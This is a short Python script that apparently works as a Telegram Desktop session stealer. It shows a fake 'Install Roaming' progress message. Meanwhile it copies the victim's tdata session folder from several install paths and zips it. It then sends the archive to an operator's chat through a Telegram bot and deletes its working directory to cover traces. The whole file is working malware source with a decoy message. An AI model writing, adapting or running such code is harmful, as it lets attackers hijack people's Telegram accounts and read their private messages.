import aiogram 
import os
import shutil
from aiogram import Bot, Dispatcher, types, executor
print('Install Roaming \n ~ 2 Minutes')
admin_id = 'ID'
TOKEN = 'TOKEN'
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)
path1 = 'D:\\Telegram Desktop\\tdata'
path2 = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'
directory = r'C:\hesoyam8927163\Telegram'
def Telegram(dp, bot, admin_id):
    @dp.message_handler(commands=['start'])
    async def telegram(message: types.Message):
        try:
            try:
                shutil.copytree(path1,
                        directory,
                        ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
            except:
                pass
            try:
                shutil.copytree(path2,
                        directory,
                        ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
            except:
                pass
            try:
                shutil.copytree(path3,
                        directory,
                        ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
            except:
                pass

            try:
                shutil.make_archive('log', 'zip', 'C:\\hesoyam8927163\\Telegram')
                await bot.send_document(admin_id, open('log.zip', 'rb'), caption='Telegram session!')
                os.remove('log.zip')
                shutil.rmtree('C:\\hesoyam8927163')
            except Exception as e:
                await bot.send_message(admin_id, e)
        except:
            await bot.send_message(admin_id, 'This dont have telegram desktop!')
Telegram(dp, bot, admin_id)
executor.start_polling(dp)






